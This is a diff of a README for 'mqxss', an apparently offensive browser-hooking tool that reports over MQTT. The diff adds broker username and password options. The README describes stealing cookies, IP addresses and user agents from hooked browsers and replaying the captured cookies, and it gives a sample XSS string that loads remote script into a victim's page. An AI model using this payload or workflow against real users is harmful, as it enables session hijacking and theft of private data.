@@ -21,12 +21,16 @@ The client utilizes the python paho.mqtt library while the js payload utilizes '
  
 ## Directions
  
-**To generate a JS payload** to hook browsers with set the -g flag at runtime along with your broker, port and topic variables.  Doing so will create your payload in the /js/ folder.  
+**To generate a JS payload** to hook browsers with set the `-g` flag at runtime along with your broker, port and topic variables.  Doing so will create your payload in the /js/ folder.  
 
 **To run the client** provide your broker, port, and topic as so 
  
 `mqxss.py -p 8081 -b some.mqtt.broker.com -t mytopicname`
- 
+
+**To run the client with credentials** provide your broker, port, user name, password and topic as so 
+
+`mqxss.py -p 8081 -b some.mqtt.broker.com -t mytopicname -u username -pw password`
+  
 **Send your XSS payload** to the victim while the mqxss client is running, ex: `'"><script src=https://example.com/x.js></script>` or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.
  
 ![a](https://github.com/grampae/mqxss/assets/36344197/20096c91-2e9e-4302-b5a9-e2edd665d382)
@@ -36,7 +40,8 @@ The client utilizes the python paho.mqtt library while the js payload utilizes '
 **Features:**
 
 - **js payload utilizes MQTT QoS 1 and Last Will, mqxss will be notified of disconnects or connects that occur while client is not connected to the broker**
-- **currently only works with mqtt brokers that use secure websockets however future version will supports mqtts as well**
+- **generate js payload at runtime to hook browsers with**
+- **currently only works with mqtt brokers that use secure websockets**
 - **open hooked browser location with captured cookies**
 - **when hooked it grabs cookies, ip, device type, user agent**
 - **view past hooked (unhooked) browsers**
@@ -47,6 +52,6 @@ The client utilizes the python paho.mqtt library while the js payload utilizes '
 **Todo:**
 
 - [ ] Encryption (currently just obfuscated)
-- [ ] Set user , password  for brokers that require it at runtime
+- [x] Set user , password  for brokers that require it at runtime
 - [x] Generate js payload at runtime to hook browsers with
 - [x] Open browser with hooked browser cookies for convenience
